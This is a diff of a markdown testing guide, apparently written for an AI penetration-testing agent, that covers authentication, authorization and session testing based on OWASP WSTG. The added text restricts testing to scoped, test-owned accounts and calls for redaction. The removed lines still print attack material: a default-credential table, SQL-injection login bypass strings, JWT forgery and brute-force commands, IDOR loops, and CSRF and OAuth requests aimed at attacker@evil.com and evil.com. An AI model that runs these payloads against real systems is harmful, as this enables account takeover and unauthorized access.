@@ -4,233 +4,52 @@ description: WSTG identity, authentication, authorization, and session managemen
 tags: [auth, session, idor, csrf, jwt, wstg]
 version: "1.0"
 ---
+# Authentication, Authorization, and Session Testing (Evidence-Led)
 
-# Auth & Session Testing (WSTG-IDNT + ATHN + AUTHZ + SESS)
+## Safety and scope
 
-## Username Enumeration Techniques
+- Confirm the exact endpoint and canonical target workspace with persisted scope before active testing.
+- Use only explicitly authorized test accounts and tokens. Never use default-credential lists against live accounts, brute-force usernames/passwords/OTPs/reset tokens, password-spray, credential-stuff, or trigger lockouts or real email/SMS.
+- Keep credentials and reset links secret. Redact token/cookie values from logs, notes, and reports.
+- Use the captured request and approved replay tool. Do not use a shell script or external scanner to expand testing beyond the authorized plan.
 
-### Error Message Differentiation
+## Username/account enumeration
 
-Test login, registration, and password reset with known vs unknown usernames:
+Only compare responses for test-owned accounts or identities explicitly provided by the program. A single controlled comparison can examine whether the application reveals different states for a known test account versus a deliberately nonexistent test identifier. Keep the request count low, avoid timing campaigns, and stop if the endpoint triggers notifications or lockouts. Distinguish intended validation messages from demonstrated security impact.
 
-```bash
-# Login form — compare responses
-curl -s -X POST https://TARGET/login -d "user=admin&pass=wrong" -o resp_valid.txt
-curl -s -X POST https://TARGET/login -d "user=nonexistent&pass=wrong" -o resp_invalid.txt
-diff resp_valid.txt resp_invalid.txt
+## Login and credential policy
 
-# Check response timing differences
-time curl -s -X POST https://TARGET/login -d "user=admin&pass=wrong" > /dev/null
-time curl -s -X POST https://TARGET/login -d "user=fake12345&pass=wrong" > /dev/null
+- Review authentication requirements, throttling configuration, MFA enforcement, recovery flow, and session invalidation from documentation, captured behavior, and safe test-account flows.
+- Do not attempt guessed/default passwords or automated login attempts. If rate-limit behavior must be tested, use a small program-approved request budget against a test account and stop before lockout or notification thresholds.
+- Do not attempt account takeover or change a real user's password/email/MFA settings.
 
-# Registration endpoint
-curl -s -X POST https://TARGET/register -d "user=admin&email=test@test.com"
-# Look for: "username already taken" vs generic error
+## JWT and session tokens
 
-# Password reset
-curl -s -X POST https://TARGET/forgot -d "email=admin@TARGET"
-# Look for: "email sent" vs "email not found"
-```
+- Prefer offline review of a token issued to a test account: algorithm, issuer, audience, expiry, not-before, and sensitive claims.
+- A decoded claim is not proof that the server trusts it. If an active negative control is necessary, alter one property of a test-owned token and send it only to a harmless authorized endpoint; verify rejection.
+- Do not brute-force signing secrets, forge tokens for another identity, test key confusion against production without explicit authorization, or expose token contents in output.
+- Review cookie flags and rotation behavior in the captured flow. A missing flag is a hardening observation unless the browser/session context demonstrates a security impact.
 
-### ffuf Enumeration
+## OAuth, reset, and MFA flows
 
-```bash
-ffuf -u https://TARGET/login -X POST -d "username=FUZZ&password=test" \
-  -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -fr "Invalid username" -mc all
-```
+- Use a test-owned client/account and inspect state, nonce, PKCE, redirect URI validation, token audience, and revocation behavior against the documented flow.
+- Use only valid test-owned reset links and known test MFA codes. Do not guess codes, enumerate reset tokens, or generate repeated outbound messages.
+- Stop before a flow changes credentials, removes MFA, grants privileges, or triggers irreversible account state unless the program supplies an isolated test fixture and explicitly authorizes it.
 
-## Default Credentials (Top 20)
+## Evidence workflow
 
-| Username      | Password      | Common On          |
-| ------------- | ------------- | ------------------ |
-| admin         | admin         | Most apps          |
-| admin         | password      | Most apps          |
-| admin         | admin123      | CMS, panels        |
-| administrator | administrator | Windows, Java      |
-| root          | root          | Linux, DBs         |
-| root          | toor          | Kali, some DBs     |
-| test          | test          | Dev environments   |
-| guest         | guest         | Legacy systems     |
-| user          | user          | Demo systems       |
-| admin         | "" (blank)    | IoT, routers       |
-| sa            | "" (blank)    | MSSQL              |
-| postgres      | postgres      | PostgreSQL         |
-| tomcat        | tomcat        | Apache Tomcat      |
-| manager       | manager       | Tomcat, JBoss      |
-| admin         | changeme      | Default installs   |
-| admin         | 123456        | Weak defaults      |
-| cisco         | cisco         | Network devices    |
-| admin         | secret        | Various            |
-| operator      | operator      | Industrial systems |
-| pi            | raspberry     | Raspberry Pi       |
+1. Capture the baseline request/response and the expected policy.
+2. Choose one hypothesis and a safe positive/negative control.
+3. Use `http_replay` only after scope check; change one factor at a time and preserve required CSRF/session context.
+4. Record request IDs, credential labels (never values), actual result, valid preconditions, and limitations.
+5. Use `verification_attempt` for each meaningful executed test and `validate_finding` for the ten-check assessment. Duplicates, planned tests, and invalid preconditions do not count.
 
-## Authentication Bypass Payloads
+A decisive confirmation may stop early. A false-positive/disproven verdict requires 20 distinct valid evidence-backed attempts and matching contradictory checks. If safety or prerequisites prevent this, keep `INCONCLUSIVE / NEEDS REVIEW`.
 
-### SQL Injection in Login
+## Coverage notes
 
-```
-admin' --
-admin' #
-admin'/*
-' OR 1=1 --
-' OR 1=1 #
-' OR '1'='1
-" OR "1"="1
-admin' OR '1'='1
-') OR ('1'='1
-```
+Record app-wide token/cookie mechanism observations as `wide` only when actually tested. Record endpoint-specific authentication enforcement as `local`. A tool call alone is not coverage; preserve what was observed and what remains unknown.
 
-### JWT Vulnerabilities
+## Reporting
 
-```bash
-# Decode JWT (no verification)
-echo "JWT_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
-
-# Test alg:none
-# Header: {"alg":"none","typ":"JWT"}
-echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_'
-
-# Brute force weak secret
-hashcat -a 0 -m 16500 JWT_TOKEN wordlist.txt
-# Or with jwt_tool:
-jwt_tool JWT_TOKEN -C -d wordlist.txt
-
-# Key confusion: RS256 → HS256
-# Sign with public key as HMAC secret
-jwt_tool JWT_TOKEN -X k -pk public.pem
-
-# kid injection
-# Header: {"alg":"HS256","kid":"../../dev/null"}
-jwt_tool JWT_TOKEN -I -hc kid -hv "../../dev/null" -S hs256 -p ""
-
-# jwk header injection
-jwt_tool JWT_TOKEN -X i
-```
-
-## Session Token Analysis
-
-```bash
-# Collect multiple session tokens
-for i in $(seq 1 20); do
-  curl -sI https://TARGET/login | grep -i "set-cookie" >> tokens.txt
-done
-
-# Check token entropy/randomness
-# Look for: sequential patterns, timestamps, predictable values
-
-# Cookie attributes check
-curl -sI https://TARGET/ | grep -i "set-cookie"
-# Verify: Secure; HttpOnly; SameSite=Strict|Lax; Path=/; Domain=
-```
-
-### Cookie Security Checklist
-
-| Attribute       | Expected           | Vulnerability        |
-| --------------- | ------------------ | -------------------- |
-| Secure          | Present            | Token sent over HTTP |
-| HttpOnly        | Present            | XSS can steal cookie |
-| SameSite        | Strict or Lax      | CSRF attacks         |
-| Path            | Restrictive (/)    | Scope too broad      |
-| Domain          | No leading dot     | Subdomain access     |
-| Expires/Max-Age | Reasonable timeout | Indefinite sessions  |
-
-## Session Fixation Test
-
-```
-1. Note session token before login (pre-auth)
-2. Login with valid credentials
-3. Check if session token changed (post-auth)
-4. If same token → Session Fixation vulnerability
-```
-
-## CSRF Testing
-
-```bash
-# Check for CSRF tokens
-curl -s https://TARGET/form-page | grep -i "csrf\|token\|_token"
-
-# Test without CSRF token
-curl -X POST https://TARGET/change-email \
-  -H "Cookie: session=USER_SESSION" \
-  -d "email=attacker@evil.com"
-
-# Test with wrong CSRF token
-curl -X POST https://TARGET/change-email \
-  -H "Cookie: session=USER_SESSION" \
-  -d "email=attacker@evil.com&csrf_token=invalid"
-```
-
-## IDOR Testing Patterns
-
-```bash
-# Numeric ID increment
-# /api/users/1 → /api/users/2 → /api/users/3
-for id in $(seq 1 20); do
-  curl -s -o /dev/null -w "%{http_code} id=$id\n" \
-    -H "Cookie: session=LOW_PRIV_SESSION" \
-    "https://TARGET/api/users/$id"
-done
-
-# UUID/GUID swap: capture another user's UUID from responses
-# Replace in: /api/profile/{uuid}, /api/orders/{uuid}
-
-# Parameter-based IDOR
-# Change user_id, account_id, order_id in POST body
-# Change role, group_id, org_id parameters
-
-# HTTP method switch
-# GET /api/users/2 (blocked) → POST /api/users/2 (allowed?)
-```
-
-## Privilege Escalation Patterns
-
-```bash
-# Horizontal: access another user's data
-# Swap session cookie / JWT between users
-# Change user ID in request body or URL
-
-# Vertical: escalate to admin
-curl -X POST https://TARGET/api/update-profile \
-  -H "Cookie: session=REGULAR_USER" \
-  -d '{"name":"test","role":"admin"}'
-
-# Add admin parameters
-curl -X POST https://TARGET/register \
-  -d "username=test&password=test&isAdmin=true"
-
-# Access admin endpoints with regular session
-curl -s -H "Cookie: session=REGULAR_USER" https://TARGET/admin/dashboard
-curl -s -H "Cookie: session=REGULAR_USER" https://TARGET/api/admin/users
-```
-
-## OAuth Testing Checklist
-
-```
-1. Redirect URI manipulation:
-   - redirect_uri=https://evil.com
-   - redirect_uri=https://TARGET.evil.com
-   - redirect_uri=https://TARGET/callback/../evil
-   - redirect_uri=https://TARGET/callback?next=https://evil.com
-
-2. State parameter:
-   - Remove state parameter entirely
-   - Reuse old state value
-   - Use empty string
-
-3. PKCE bypass:
-   - Omit code_verifier in token request
-   - Use plain instead of S256
-
-4. Token leakage:
-   - Check access token in URL fragment
-   - Check referrer header leaks token
-   - Check browser history
-```
-
-For detailed procedures on any test, read:
-`knowledge/web-application/WSTG-IDNT/WSTG-IDNT-{NN}.md`
-`knowledge/web-application/WSTG-ATHN/WSTG-ATHN-{NN}.md`
-`knowledge/web-application/WSTG-AUTHZ/WSTG-AUTHZ-{NN}.md`
-`knowledge/web-application/WSTG-SESS/WSTG-SESS-{NN}.md`
+Report only a demonstrated policy violation and its minimal redacted reproduction. Never include credentials, tokens, cookies, reset links, OTPs, personal data, or another user's records.
